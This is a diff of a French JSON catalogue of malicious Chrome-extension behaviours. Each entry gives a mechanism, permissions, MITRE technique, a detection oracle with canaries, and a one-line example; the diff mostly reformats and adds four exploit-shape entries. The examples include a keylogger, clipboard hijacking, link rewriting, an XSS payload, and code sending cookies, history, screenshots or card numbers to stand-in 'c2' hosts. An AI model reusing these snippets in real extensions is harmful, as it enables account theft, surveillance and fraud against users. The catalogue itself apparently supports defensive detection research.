@@ -8,12 +8,26 @@
       "class": "data-stealing",
       "empoweb": "exfiltration",
       "mechanism": "Un handler (content script relayant au service worker, ou directement le SW) lit tous les cookies du domaine actif puis les exfiltre vers un C2. Permet le vol de session et le détournement de compte.",
-      "chrome_apis": ["chrome.cookies.getAll", "chrome.tabs.query", "fetch"],
-      "permissions": ["cookies", "activeTab", "storage"],
+      "chrome_apis": [
+        "chrome.cookies.getAll",
+        "chrome.tabs.query",
+        "fetch"
+      ],
+      "permissions": [
+        "cookies",
+        "activeTab",
+        "storage"
+      ],
       "trigger": "message reçu demandant les cookies (ex. {cmd:'getCookies'}) OU démarrage du SW ; cible une page connectée (cookie de session présent).",
       "example": "chrome.cookies.getAll({domain}, cs => fetch('https://c2/collect',{method:'POST',body:JSON.stringify(cs)}));",
-      "oracle": {"kind": "exfiltration", "canary": "cookie", "detect": "le cookie canary réapparait dans une requête sortante externe"},
-      "mitre": ["T1539"],
+      "oracle": {
+        "kind": "exfiltration",
+        "canary": "cookie",
+        "detect": "le cookie canary réapparait dans une requête sortante externe"
+      },
+      "mitre": [
+        "T1539"
+      ],
       "source_ref": "arXiv:2503.04292 Fig.1"
     },
     {
@@ -22,12 +36,27 @@
       "class": "monitoring-surveillance",
       "empoweb": "exfiltration",
       "mechanism": "Le content script injecte un écouteur keydown sur la page, accumule les frappes et les envoie au service worker via message ; le SW les exfiltre.",
-      "chrome_apis": ["addEventListener('keydown')", "chrome.runtime.sendMessage", "chrome.tabs.sendMessage", "fetch"],
-      "permissions": ["activeTab", "scripting", "storage"],
+      "chrome_apis": [
+        "addEventListener('keydown')",
+        "chrome.runtime.sendMessage",
+        "chrome.tabs.sendMessage",
+        "fetch"
+      ],
+      "permissions": [
+        "activeTab",
+        "scripting",
+        "storage"
+      ],
       "trigger": "événements clavier sur une page (saisie dans un champ) ; message type 'getKeys'/'fetchData'.",
       "example": "window.addEventListener('keydown',e=>buf.push(e.key)); chrome.runtime.sendMessage({type:'keys',d:buf.join('')});",
-      "oracle": {"kind": "exfiltration", "canary": "creds", "detect": "la valeur tapée canary (champ password) réapparait dans une requête sortante"},
-      "mitre": ["T1056.001"],
+      "oracle": {
+        "kind": "exfiltration",
+        "canary": "creds",
+        "detect": "la valeur tapée canary (champ password) réapparait dans une requête sortante"
+      },
+      "mitre": [
+        "T1056.001"
+      ],
       "source_ref": "arXiv:2503.04292 Fig.2"
     },
     {
@@ -36,12 +65,28 @@
       "class": "monitoring-surveillance",
       "empoweb": "exfiltration",
       "mechanism": "Au chargement d'un onglet, l'extension capture l'onglet visible en PNG et l'envoie à un serveur attaquant.",
-      "chrome_apis": ["chrome.tabs.captureVisibleTab", "chrome.tabs.onUpdated", "chrome.runtime.onInstalled", "fetch"],
-      "permissions": ["tabs", "activeTab", "scripting", "storage"],
+      "chrome_apis": [
+        "chrome.tabs.captureVisibleTab",
+        "chrome.tabs.onUpdated",
+        "chrome.runtime.onInstalled",
+        "fetch"
+      ],
+      "permissions": [
+        "tabs",
+        "activeTab",
+        "scripting",
+        "storage"
+      ],
       "trigger": "navigation d'onglet : chrome.tabs.onUpdated avec status='complete' (donc : naviguer sur des pages).",
       "example": "chrome.tabs.onUpdated.addListener((id,c)=>{if(c.status==='complete')chrome.tabs.captureVisibleTab(null,{format:'png'},d=>fetch('https://c2',{method:'POST',body:d}));});",
-      "oracle": {"kind": "exfiltration", "canary": "none", "detect": "upload PNG/binaire vers un hôte externe après navigation"},
-      "mitre": ["T1113"],
+      "oracle": {
+        "kind": "exfiltration",
+        "canary": "none",
+        "detect": "upload PNG/binaire vers un hôte externe après navigation"
+      },
+      "mitre": [
+        "T1113"
+      ],
       "source_ref": "arXiv:2503.04292 Fig.3"
     },
     {
@@ -50,12 +95,27 @@
       "class": "monitoring-surveillance",
       "empoweb": "exfiltration",
       "mechanism": "L'extension lit l'historique de navigation (URLs + timestamps) et l'exfiltre pour profilage / phishing ciblé.",
-      "chrome_apis": ["chrome.history.search", "chrome.history.getVisits", "fetch"],
-      "permissions": ["history", "tabs", "scripting", "storage"],
+      "chrome_apis": [
+        "chrome.history.search",
+        "chrome.history.getVisits",
+        "fetch"
+      ],
+      "permissions": [
+        "history",
+        "tabs",
+        "scripting",
+        "storage"
+      ],
       "trigger": "démarrage du SW / périodique ; l'historique doit contenir des entrées (naviguer d'abord).",
       "example": "chrome.history.search({text:'',maxResults:1000},items=>fetch('https://c2',{method:'POST',body:JSON.stringify(items)}));",
-      "oracle": {"kind": "exfiltration", "canary": "history", "detect": "l'URL d'historique canary réapparait dans une requête sortante"},
-      "mitre": ["T1217"],
+      "oracle": {
+        "kind": "exfiltration",
+        "canary": "history",
+        "detect": "l'URL d'historique canary réapparait dans une requête sortante"
+      },
+      "mitre": [
+        "T1217"
+      ],
       "source_ref": "arXiv:2503.04292 Fig.4"
     },
     {
@@ -64,12 +124,24 @@
       "class": "monitoring-surveillance",
       "empoweb": "direct",
       "mechanism": "L'extension injecte du JS dans la page qui appelle getUserMedia pour activer la caméra/micro et streame vers un serveur.",
-      "chrome_apis": ["navigator.mediaDevices.getUserMedia", "chrome.scripting.executeScript", "chrome.tabs.onUpdated"],
-      "permissions": ["scripting", "activeTab"],
+      "chrome_apis": [
+        "navigator.mediaDevices.getUserMedia",
+        "chrome.scripting.executeScript",
+        "chrome.tabs.onUpdated"
+      ],
+      "permissions": [
+        "scripting",
+        "activeTab"
+      ],
       "trigger": "chargement de page (chrome.tabs.onUpdated).",
       "example": "navigator.mediaDevices.getUserMedia({video:true}).then(stream=>{/* stream vers C2 */});",
-      "oracle": {"kind": "capability", "detect": "appel getUserMedia observé (console/trace) et/ou stream sortant"},
-      "mitre": ["T1125"],
+      "oracle": {
+        "kind": "capability",
+        "detect": "appel getUserMedia observé (console/trace) et/ou stream sortant"
+      },
+      "mitre": [
+        "T1125"
+      ],
       "source_ref": "arXiv:2503.04292 Fig.7"
     },
     {
@@ -78,12 +150,25 @@
       "class": "content-manipulation",
       "empoweb": "indirect",
       "mechanism": "Le content script insère dynamiquement des conteneurs publicitaires (div/iframe) dans la page, parfois non-fermables, redirigeant vers des sites frauduleux.",
-      "chrome_apis": ["document.createElement", "document.body.appendChild", "MutationObserver"],
-      "permissions": ["content_scripts", "activeTab", "scripting"],
+      "chrome_apis": [
+        "document.createElement",
+        "document.body.appendChild",
+        "MutationObserver"
+      ],
+      "permissions": [
+        "content_scripts",
+        "activeTab",
+        "scripting"
+      ],
       "trigger": "chargement de n'importe quelle page.",
       "example": "var ad=document.createElement('iframe');ad.src='https://ads/x';document.body.appendChild(ad);",
-      "oracle": {"kind": "manipulation", "detect": "élément injecté (iframe/div) avec src externe non présent dans la page d'origine (diff DOM) et/ou requête ad sortante"},
-      "mitre": ["T1185"],
+      "oracle": {
+        "kind": "manipulation",
+        "detect": "élément injecté (iframe/div) avec src externe non présent dans la page d'origine (diff DOM) et/ou requête ad sortante"
+      },
+      "mitre": [
+        "T1185"
+      ],
       "source_ref": "arXiv:2503.04292 §5.8"
     },
     {
@@ -92,12 +177,24 @@
       "class": "content-manipulation",
       "empoweb": "indirect",
       "mechanism": "Un MutationObserver surveille le DOM et réécrit les attributs href des liens vers des domaines attaquants (phishing), ou modifie le contenu affiché.",
-      "chrome_apis": ["MutationObserver", "element.setAttribute('href')", "document.querySelectorAll"],
-      "permissions": ["content_scripts"],
+      "chrome_apis": [
+        "MutationObserver",
+        "element.setAttribute('href')",
+        "document.querySelectorAll"
+      ],
+      "permissions": [
+        "content_scripts"
+      ],
       "trigger": "page avec des liens / changements DOM.",
       "example": "new MutationObserver(()=>document.querySelectorAll('a').forEach(a=>a.href='https://phish')).observe(document,{subtree:true,childList:true});",
-      "oracle": {"kind": "manipulation", "detect": "un href/ancre canary de la page est réécrit vers un domaine différent (diff DOM) ; ou navigation top-level inattendue"},
-      "mitre": ["T1185", "T1566"],
+      "oracle": {
+        "kind": "manipulation",
+        "detect": "un href/ancre canary de la page est réécrit vers un domaine différent (diff DOM) ; ou navigation top-level inattendue"
+      },
+      "mitre": [
+        "T1185",
+        "T1566"
+      ],
       "source_ref": "arXiv:2503.04292 Fig.6"
     },
     {
@@ -106,12 +203,24 @@
       "class": "request-forgery",
       "empoweb": "direct",
       "mechanism": "L'extension repère un bouton cible (ex. like) et déclenche un clic simulé, persistant via MutationObserver — fausse l'engagement / exécute des actions sans consentement.",
-      "chrome_apis": ["document.querySelector", "element.click", "MutationObserver"],
-      "permissions": ["activeTab", "scripting"],
+      "chrome_apis": [
+        "document.querySelector",
+        "element.click",
+        "MutationObserver"
+      ],
+      "permissions": [
+        "activeTab",
+        "scripting"
+      ],
       "trigger": "page cible contenant le bouton (sélecteur spécifique) ; interaction/hover.",
       "example": "var b=document.querySelector('button[aria-label*=\"like\"]'); if(b) b.click();",
-      "oracle": {"kind": "manipulation", "detect": "clic programmatique sur un élément canary / changement d'état déclenché sans action utilisateur réelle"},
-      "mitre": ["T1185"],
+      "oracle": {
+        "kind": "manipulation",
+        "detect": "clic programmatique sur un élément canary / changement d'état déclenché sans action utilisateur réelle"
+      },
+      "mitre": [
+        "T1185"
+      ],
       "source_ref": "arXiv:2503.04292 Fig.5"
     },
     {
@@ -120,12 +229,25 @@
       "class": "data-stealing",
       "empoweb": "exfiltration",
       "mechanism": "Le content script lit les valeurs de champs sensibles (password, cc-number, cvv) au submit ou au change, et les exfiltre.",
-      "chrome_apis": ["addEventListener('submit')", "input.value", "fetch"],
-      "permissions": ["content_scripts", "<all_urls>"],
+      "chrome_apis": [
+        "addEventListener('submit')",
+        "input.value",
+        "fetch"
+      ],
+      "permissions": [
+        "content_scripts",
+        "<all_urls>"
+      ],
       "trigger": "submit d'un formulaire login/checkout (champs autocomplete=current-password / cc-number).",
       "example": "document.addEventListener('submit',()=>fetch('https://c2',{method:'POST',body:document.querySelector('[autocomplete=cc-number]').value}),true);",
-      "oracle": {"kind": "exfiltration", "canary": "card|creds", "detect": "le numéro de carte / mot de passe canary réapparait dans une requête sortante"},
-      "mitre": ["T1056.003"],
+      "oracle": {
+        "kind": "exfiltration",
+        "canary": "card|creds",
+        "detect": "le numéro de carte / mot de passe canary réapparait dans une requête sortante"
+      },
+      "mitre": [
+        "T1056.003"
+      ],
       "source_ref": "arXiv:2503.04292 §4 (Data Stealing)"
     },
     {
@@ -134,12 +256,26 @@
       "class": "data-stealing",
       "empoweb": "direct",
       "mechanism": "L'extension surveille le presse-papier ou l'événement copy et REMPLACE une adresse crypto copiée par celle de l'attaquant (ou exfiltre la seed phrase).",
-      "chrome_apis": ["navigator.clipboard.writeText", "navigator.clipboard.readText", "addEventListener('copy')"],
-      "permissions": ["clipboardRead", "clipboardWrite", "content_scripts"],
+      "chrome_apis": [
+        "navigator.clipboard.writeText",
+        "navigator.clipboard.readText",
+        "addEventListener('copy')"
+      ],
+      "permissions": [
+        "clipboardRead",
+        "clipboardWrite",
+        "content_scripts"
+      ],
       "trigger": "événement copy sur une page portant une adresse wallet / seed phrase.",
       "example": "document.addEventListener('copy',()=>navigator.clipboard.writeText('0xATTACKER'));",
-      "oracle": {"kind": "manipulation", "canary": "wallet", "detect": "l'adresse wallet canary dans le presse-papier/DOM est remplacée par une autre (diff), ou la seed canary est exfiltrée"},
-      "mitre": ["T1115"],
+      "oracle": {
+        "kind": "manipulation",
+        "canary": "wallet",
+        "detect": "l'adresse wallet canary dans le presse-papier/DOM est remplacée par une autre (diff), ou la seed canary est exfiltrée"
+      },
+      "mitre": [
+        "T1115"
+      ],
       "source_ref": "arXiv:2503.04292 §4 ; threat landscape 2024"
     },
     {
@@ -148,12 +284,29 @@
       "class": "request-forgery",
       "empoweb": "direct",
       "mechanism": "Une page web malveillante envoie un message (postMessage / onMessageExternal) qu'un handler de l'extension route, sans vérifier l'origine, vers une API privilégiée (executeScript, cookies.set, downloads, storage) — la page gagne les privilèges de l'extension.",
-      "chrome_apis": ["chrome.scripting.executeScript", "chrome.cookies.set", "chrome.downloads.download", "chrome.storage.local.set"],
-      "permissions": ["scripting", "cookies", "downloads", "storage", "<all_urls>"],
+      "chrome_apis": [
+        "chrome.scripting.executeScript",
+        "chrome.cookies.set",
+        "chrome.downloads.download",
+        "chrome.storage.local.set"
+      ],
+      "permissions": [
+        "scripting",
+        "cookies",
+        "downloads",
+        "storage",
+        "<all_urls>"
+      ],
       "trigger": "page attaquante postMessage avec la forme EXACTE que le handler vérifie (champ/type/cmd) ; pas de check d'origine.",
       "example": "window.postMessage({cmd:'exec', code:'/*payload*/'}, '*');  // le content script relaie au SW qui appelle executeScript",
-      "oracle": {"kind": "differential", "canary": "sink-value", "detect": "le sink privilégié se déclenche avec la valeur canary de l'attaquant ET ne se déclenche pas sans (attacker_controlled)"},
-      "mitre": ["T1203"],
+      "oracle": {
+        "kind": "differential",
+        "canary": "sink-value",
+        "detect": "le sink privilégié se déclenche avec la valeur canary de l'attaquant ET ne se déclenche pas sans (attacker_controlled)"
+      },
+      "mitre": [
+        "T1203"
+      ],
       "source_ref": "EmPoWeb (direct danger) ; DoubleX empoweb"
     },
     {
@@ -162,13 +315,112 @@
       "class": "request-forgery",
       "empoweb": "indirect",
       "mechanism": "La page attaquante fait écrire une valeur contrôlée dans chrome.storage ; cette valeur est plus tard relue et coule vers un sink dangereux (eval, executeScript, innerHTML) — exploitation en deux temps.",
-      "chrome_apis": ["chrome.storage.sync.set", "chrome.storage.sync.get", "eval", "innerHTML"],
-      "permissions": ["storage"],
+      "chrome_apis": [
+        "chrome.storage.sync.set",
+        "chrome.storage.sync.get",
+        "eval",
+        "innerHTML"
+      ],
+      "permissions": [
+        "storage"
+      ],
       "trigger": "message -> storage.set(valeur attaquant) ; puis relecture -> sink.",
       "example": "chrome.storage.sync.set({cfg: attackerValue}); /* ... */ chrome.storage.sync.get('cfg', v=>eval(v.cfg));",
-      "oracle": {"kind": "differential", "canary": "storage", "detect": "la valeur canary écrite via la page atteint le sink (storage->sink) et pas sans l'attaquant"},
-      "mitre": ["T1203"],
+      "oracle": {
+        "kind": "differential",
+        "canary": "storage",
+        "detect": "la valeur canary écrite via la page atteint le sink (storage->sink) et pas sans l'attaquant"
+      },
+      "mitre": [
+        "T1203"
+      ],
       "source_ref": "EmPoWeb (indirect danger) ; DoubleX empoweb"
+    },
+    {
+      "id": "relay-multihop-forwarding",
+      "name": "Multi-context message relay (content-script -> background -> sink)",
+      "class": "exploit-shape",
+      "empoweb": "message-passing",
+      "mechanism": "Le content-script expose un canal page (window.message / API globale) et FORWARD le message au service worker via chrome.runtime.sendMessage / chrome.tabs.sendMessage ; le sink dangereux est atteint dans le handler background, pas dans l'entree. Un PoC mono-saut echoue car il ne faconne que le message d'entree.",
+      "chrome_apis": [
+        "window.postMessage",
+        "runtime.sendMessage",
+        "tabs.sendMessage"
+      ],
+      "permissions": [],
+      "trigger": "poster sur le canal d'entree atteignable un message portant DEJA les champs de garde/route attendus par le handler background + la donnee attaquante, pour qu'il soit relaye verbatim jusqu'au sink.",
+      "example": "window.postMessage({namespace:'landocs', action:'download', requestId:'x', payload:'CANARY_...'}, '*')  // le CS relaie {action,payload} au SW qui atteint le sink",
+      "oracle": {
+        "kind": "sink-call",
+        "canary": "CANARY_",
+        "detect": "le canari apparait au sink background (storage/network/code)"
+      },
+      "mitre": "T1190",
+      "source_ref": "ExtPoCGen P1 (contrat multi-hop)"
+    },
+    {
+      "id": "config-repoint-then-trigger",
+      "name": "Stateful config repoint then network trigger",
+      "class": "exploit-shape",
+      "empoweb": "exfiltration",
+      "mechanism": "Un premier message/methode (re)pointe un hote/URL de configuration (stocke en storage) ; un second declenche l'action reseau (fetch/XHR) qui part vers cet hote. Un PoC a un seul message ne peut pas le prouver.",
+      "chrome_apis": [
+        "fetch",
+        "XMLHttpRequest",
+        "storage.local.set"
+      ],
+      "permissions": [
+        "storage"
+      ],
+      "trigger": "ETAPE 1 configurer l'hote vers l'hote sandbox du harness ; ETAPE 2 declencher l'envoi avec le canari dans le corps.",
+      "example": "window.zebraPrint.configure('127.0.0.1', 8000); window.zebraPrint('CANARY_...zpl')  // fetch http://127.0.0.1:8000 body=CANARY_",
+      "oracle": {
+        "kind": "outbound-request",
+        "canary": "CANARY_",
+        "detect": "le canari apparait dans une requete sortante vers l'hote repointe (sinkhole)"
+      },
+      "mitre": "T1567",
+      "source_ref": "ExtPoCGen P1 (contrat a etat)"
+    },
+    {
+      "id": "shadowroot-innerhtml-via-state",
+      "name": "DOM injection via state-driven render (shadowRoot.innerHTML)",
+      "class": "exploit-shape",
+      "empoweb": "dom-xss",
+      "mechanism": "Un message met a jour un etat interne (currentState) puis une fonction de rendu ecrit des champs non assainis dans shadowRoot.innerHTML / innerHTML. L'injection ne part qu'APRES le re-render, pas a la reception du message.",
+      "chrome_apis": [
+        "innerHTML"
+      ],
+      "permissions": [],
+      "trigger": "envoyer le message d'etat portant un champ (title/url) contenant le canari dans un contexte HTML, puis laisser le re-render l'ecrire dans le DOM.",
+      "example": "postMessage({type:'state', bookmarks:[{title:'<img src=x onerror=0>CANARY_'}]})",
+      "oracle": {
+        "kind": "dom-sink",
+        "canary": "CANARY_",
+        "detect": "le canari transite par innerHTML (hook frontiere, monde isole)"
+      },
+      "mitre": "T1059.007",
+      "source_ref": "ExtPoCGen P2 (skeleton manquant)"
+    },
+    {
+      "id": "response-channel-handshake",
+      "name": "Correlated request/response channel (requestId handshake)",
+      "class": "exploit-shape",
+      "empoweb": "message-passing",
+      "mechanism": "L'extension repond sur un canal de REPONSE dedie (window.postMessage {channel:RESPONSE, id}) correle par requestId. Un PoC qui n'ecoute pas le canal de reponse / ne correle pas l'id rate l'observation.",
+      "chrome_apis": [
+        "window.postMessage"
+      ],
+      "permissions": [],
+      "trigger": "poster la requete avec un requestId, PUIS ecouter window 'message' et correler la reponse sur le meme id, en y placant/attendant le canari.",
+      "example": "postMessage({channel:'REQ', id:'42', q:'CANARY_'}); onmessage = e => e.data.channel==='RESP' && e.data.id==='42'",
+      "oracle": {
+        "kind": "postmessage",
+        "canary": "CANARY_",
+        "detect": "le canari apparait sur le canal de reponse correle"
+      },
+      "mitre": "T1190",
+      "source_ref": "ExtPoCGen P2 (skeleton manquant)"
     }
   ]
 }
